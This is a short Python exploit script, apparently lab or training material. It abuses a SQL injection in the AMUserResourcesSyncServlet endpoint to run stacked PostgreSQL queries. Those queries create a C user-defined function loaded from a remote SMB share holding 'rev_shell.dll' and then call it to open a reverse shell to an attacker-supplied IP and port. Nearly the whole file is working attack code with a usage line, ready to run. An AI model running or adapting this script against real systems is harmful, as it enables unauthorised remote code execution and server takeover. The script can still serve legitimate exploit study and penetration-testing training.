import requests, sys
requests.packages.urllib3.disable_warnings()

def log(msg):
   print(msg)

def make_request(url, sql):
   log("[*] Executing query: {}".format(sql[0:])) 
   print(url.format(sql))
   r = requests.get( url.format(sql), verify=False)
   return r

def create_udf_func(url):
   log("[+] Creating function...")
   sql = "create+or+replace+function+connect_back(text,integer)+returns+void+AS+$$\\\\192.168.119.137\\awae\\rev_shell.dll$$,+$$connect_back$$+STRICT+LANGUAGE+C"
   #sql = "create or replace function connect(text, integer) returns void AS $$\\\\192.168.119.137\\awae\\awae.dll$$, $$connect_back$$ STRICT LANGUAGE C"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select connect_back($${}$$, {})".format(ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print("[-] Usage: {} serverIP:port attackerIP port".format(sys.argv[0]))  
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{};--" 
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)
